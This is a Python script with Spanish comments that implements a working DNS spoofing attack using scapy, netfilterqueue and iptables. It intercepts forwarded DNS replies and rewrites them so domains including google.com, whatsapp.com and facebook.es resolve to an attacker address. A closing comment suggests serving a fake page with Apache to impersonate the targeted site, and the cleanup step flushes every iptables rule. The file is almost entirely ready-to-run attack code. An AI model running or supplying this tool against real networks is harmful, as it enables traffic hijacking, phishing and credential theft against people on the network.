from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

class DNSspoofer:
    def __init__(self, targets=None, queue_num=0):
        if not targets:
            raise ValueError("Los objetivos debe ser un diccionario de la forma b('domain.com': IP_ATACANTE)")
        # Registros de mapeo DNS
        self.targets = targets
        self.queue_num = queue_num
        # Insertar reglas iptables
        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queue_num}')
        self.queue = NetfilterQueue()
    
    # Se procesan los paquetes
    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR) and scapy_packet[DNSQR].qname in self.targets:
            original_summary = scapy_packet.summary()
            scapy_packet = self.modify_packets(scapy_packet)
            modified_summary = scapy_packet.summary()
            print(f'[Modificado]: {original_summary} => {modified_summary}')
            packet.set_payload(bytes(scapy_packet))
        packet.accept()
    
    def modify_packets(self, packet):
        qname = packet[DNSQR].qname
        # Se va a sobreescribir la respuesta original
        packet[DNS].an = DNSRR(rrname=qname, rdata=self.targets[qname])
        packet[DNS].ancount = 1
        # Recalculamos los campos de control
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet
    
    def run(self):
        try:
            print('[+] Iniciando DNS Spoofing...')
            print('Dominios que se van a interceptar:')
            # Se mostrarán los dominios
            for domain, _ in self.targets.items():
                print(f' - {domain}')
            self.queue.bind(self.queue_num, self.process_packet)
            self.queue.run()
        except KeyboardInterrupt:
            print('Deteniendo proceso de captura y limpiando entorno...')
            # Limpiar reglas iptables
            os.system('iptables --flush')

if __name__ == "__main__":
    targets = {
        # AL final del nombre de dominio va el punto porque puede tener un subdominio y la forma de resolver la dirección sería así.
        b'testeando.com.': '192.168.146.138',
        b'facebook.es': '192.168.146.138',
        b'google.com.': '192.168.146.138',
        b'whatsapp.com.': '192.168.146.138'
    }
    dnspoofer = DNSspoofer(targets=targets)
    dnspoofer.run()

    '''
    Se recomienda activar apache y reemplazar el index por defecto por alguna página
    para terminar de completar el spoofing y suplantar la página en cuestión.
    '''